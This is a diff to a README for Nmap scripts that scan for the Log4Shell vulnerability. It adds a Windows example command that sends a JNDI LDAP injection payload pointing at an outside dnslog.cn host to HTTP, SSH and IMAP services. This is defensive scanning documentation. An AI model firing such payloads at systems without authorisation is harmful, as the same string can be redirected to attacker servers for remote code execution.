@@ -10,6 +10,11 @@ Note that NSE scripts will only issue the requests to the services. Nmap will no
 Also note that DNS resolution with prefixes combination in a expression for log4j-core <= 2.7 seems not supported. So, testing with something like ```${java:os}``` could lead to false negatives.
 Therefore, better to have few false positives than negatives.
 
+Windows Example (Thanks to @ZedFuzz) - note how to [escape the quotes](https://nmap.org/book/nse-usage.html#nse-args):
+```
+nmap -v --script=http-log4shell,ssh-log4shell,imap-log4shell "--script-args=log4shell.payload=\"${jndi:ldap://{{target}}.xxxx.dnslog.cn}\"" -T4 -n -p22,80 --script-timeout=1m scanme.nmap.org
+```
+
 ### By help of logdns (custom DNS logging server)
 
 Go to http://github.com/kost/logdns and get DNS server. Get domain and point to the somewhere where you have installed logdns:
